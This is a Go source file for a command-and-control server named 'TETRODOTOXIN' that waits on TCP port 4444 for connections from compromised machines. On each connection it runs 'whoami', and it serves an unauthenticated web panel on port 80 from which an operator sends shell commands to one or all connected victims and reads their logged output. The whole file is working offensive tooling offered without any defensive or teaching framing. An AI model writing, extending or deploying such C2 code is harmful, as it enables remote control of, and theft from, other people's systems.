package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/gorilla/mux"
)

const LOGS_PATH = "./logs/"
const TEMPLATE = `
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #2a2e2d;
            color: #953ca3;
            font-family: 'Roboto', sans-serif;
        }

        h1 {
            user-select: none;
            font-size: 5vh;
            margin-bottom: 0;
        }

        h2 {
            font-size: 2vh;
            color: #7a4483;
            font-weight: 100;
            user-select: none;
            margin: 0;
            margin-bottom: 2vh;
        }

        h3 {
            margin: 0;
        }

        input[type=text] {
            color: #953ca3;
            margin-left: 1vh;
            border: 0.2vw solid #7a4483;
            border-radius: 0.4vh;
            background-color: #2d2d2d;
            padding: 1vh;
        }

        input[type=text]:hover,
        input[type=text]:focus {
            border: 0.2vw solid #953ca3;
            box-shadow: 0 0 0.35vw #953ca3;
            outline: none;
        }

        .inputbar {
            text-align: center;
            user-select: none;
        }

        .inputbar,
        input[type=text] {
            font-size: 2.2vh;
            margin-bottom: 1vh;
        }

        .container {
            display: flex;
            flex-direction: row;
            justify-content: center;
            flex-wrap: wrap;
        }

        .term {
            display: flex;
            flex-direction: column;
            flex-wrap: wrap;
            align-items: center;
            margin: 1vh;
        }

        .term p {
            width: 30vh;
            overflow: scroll;
            height: 20vh;
            background-color: #2d2d2d;
            border-top: 0.5vw solid rgba(0, 0, 0, 0.1);
            border-left: 0.5vw solid rgba(0, 0, 0, 0.1);
            padding: 1vh;
        }

        .term p::-webkit-scrollbar {
            width: 1vh;
            height: 1vh;
        }

        .term p::-webkit-scrollbar-track {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .term p::-webkit-scrollbar-thumb {
            -webkit-border-radius: 0.3vh;
            border-radius: 0.3vh;
            background: #953ca3;
        }

        .term p::-webkit-scrollbar-thumb:window-inactive {
            background: #7a4483;
        }

        .term p::-webkit-scrollbar-corner {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .term input {
            font-size: 1.5vh;
            width: 25vh;
        }
    </style>
    <title>TETRODOTOXIN</title>
</head>

<body>
    <h1 align="center">TETRODOTOXIN</h1>
    <h2 align="center">COMMAND & CONTROL</h2>

    <form align="center" class="inputbar" action="/api/cmd" method="POST">
        $<input name="command" type="text">
    </form>
    <div class="container">%s</div>
</body>

</html>`

var clients = make(map[string]net.Conn)
var replacer = strings.NewReplacer(".", "_", ":", "-")

const HEADER_SOCK = "[SOCK]"
const HEADER_HTTP = "[HTTP]"

func ConsoleLog(header string, message string) {
	log.Println(header, message)
}

func ConsoleError(header string, err error) {
	log.Println("*", header, err)
}

func ConsoleFatal(header string, err error) {
	log.Fatalln("!", header, err)
}

func main() {
	if _, err := os.Stat(LOGS_PATH); os.IsNotExist(err) {
		os.Mkdir(LOGS_PATH, 0777)
	}
	go Socket()
	go API()
	for {
	}
}

func Socket() {
	listener, err := net.Listen("tcp", ":4444")
	if err != nil {
		ConsoleFatal(HEADER_SOCK, err)
		return
	}

	ConsoleLog(HEADER_SOCK, "Listening for client connections on :4444...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			ConsoleError(HEADER_SOCK, err)
			continue
		}

		go HandleClient(conn, nil)
	}
}

func API() {
	r := mux.NewRouter()
	r.HandleFunc("/", Index)
	r.HandleFunc("/api/cmd", ApiCmd)

	ConsoleLog(HEADER_HTTP, "Web server listening on :80...")
	ConsoleFatal(HEADER_HTTP, http.ListenAndServe(":80", r))
}

func Index(w http.ResponseWriter, r *http.Request) {
	var terms string

	for _, client := range clients {
		addr := client.RemoteAddr().String()
		id := FormatAddr(addr)
		logs, err := os.ReadFile(LOGS_PATH + id)

		san := strings.NewReplacer("\r\n", "<br>", "\n", "<br>", "&", "&amp;", "<", "&lt;", ">", "&gt;", "'", "&quot;", "\"", "&#39;")

		if err == nil {
			logs_html := san.Replace(string(logs))
			terms += fmt.Sprintf(`<div class="term">
		<h3>%s</h3>
		<p>
			%s
		</p>
		<form action="/api/cmd?id=%s" method="POST">
			<input name="command" type="text">
		</form>
		</div>`, addr, logs_html, id)
		}
	}

	fmt.Fprintf(w, TEMPLATE, terms)
}

func ApiCmd(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		r.ParseForm()
		command, ok := r.Form["command"]
		if !ok {
			w.WriteHeader(http.StatusBadRequest)
			ConsoleLog(HEADER_HTTP, "Status Code 400: Missing the command query parameter.")
			return
		}

		id, ok := r.Form["id"]
		if ok {
			for k := range clients {
				if k == id[0] {
					client := clients[id[0]]

					err := LogCommand(client, command[0], w)

					if err == nil {
						http.Redirect(w, r, "/", http.StatusSeeOther)
					}

					return
				}
			}
			w.WriteHeader(http.StatusBadRequest)
			ConsoleLog(HEADER_HTTP, "Status Code 400: No such client.")
		} else {
			for _, client := range clients {
				err := LogCommand(client, command[0], w)

				if err != nil {
					return
				}
			}
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
	}

	w.WriteHeader(http.StatusMethodNotAllowed)
	ConsoleLog(HEADER_HTTP, "Status Code 405: Only POST is allowed.")
}

func HandleClient(c net.Conn, w http.ResponseWriter) {
	ip := c.RemoteAddr().String()
	format_addr := FormatAddr(ip)
	clients[format_addr] = c
	LogCommand(c, "whoami", w)
	ConsoleLog(HEADER_SOCK, (ip + " just connected!"))
}

func Read(conn net.Conn, delim byte) (string, error) {
	reader := bufio.NewReader(conn)
	var buffer bytes.Buffer
	for {
		ba, isPrefix, err := reader.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			return "", err
		}
		buffer.Write(ba)
		if !isPrefix {
			break
		}
	}
	return buffer.String(), nil
}

func WriteRead(conn net.Conn, content string, delim byte) (string, string, error) {
	writer := bufio.NewWriter(conn)
	_, err := writer.WriteString(content + "\n")
	if err != nil {
		return "", "", err
	}

	err = writer.Flush()

	b64stdout, err := Read(conn, delim)
	stdout, _ := base64.StdEncoding.DecodeString(b64stdout)
	b64stderr, err := Read(conn, delim)
	stderr, _ := base64.StdEncoding.DecodeString(b64stderr)

	return string(stdout), string(stderr), err
}

func LogCommand(c net.Conn, command string, w http.ResponseWriter) error {
	stdout, stderr, err := WriteRead(c, command, 10)
	if err != nil {
		for addr, conn := range clients {
			if conn == c {
				delete(clients, addr)
				ConsoleLog(HEADER_SOCK, "Lost connection with client "+addr+"...")
				break
			}
		}
		return nil
	}

	err = Log(c, "$ "+command+"\n")

	if err != nil {
		if w != nil {
			w.WriteHeader(http.StatusInternalServerError)
		}
		ConsoleError(HEADER_HTTP, err)
		return err
	}

	err = Log(c, stdout)
	if err != nil {
		if w != nil {
			w.WriteHeader(http.StatusInternalServerError)
		}
		ConsoleError(HEADER_HTTP, err)
		return err
	}

	err = Log(c, stderr)
	if err != nil {
		if w != nil {
			w.WriteHeader(http.StatusInternalServerError)
		}
		ConsoleError(HEADER_HTTP, err)
		return err
	}
	return nil
}

func Log(c net.Conn, data string) error {
	f, err := os.OpenFile(LOGS_PATH+FormatAddr(c.RemoteAddr().String()), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0777)
	if err != nil {
		return err
	}
	_, err = f.WriteString(data)
	return err
}

func FormatAddr(addr string) string {
	return replacer.Replace(addr)
}
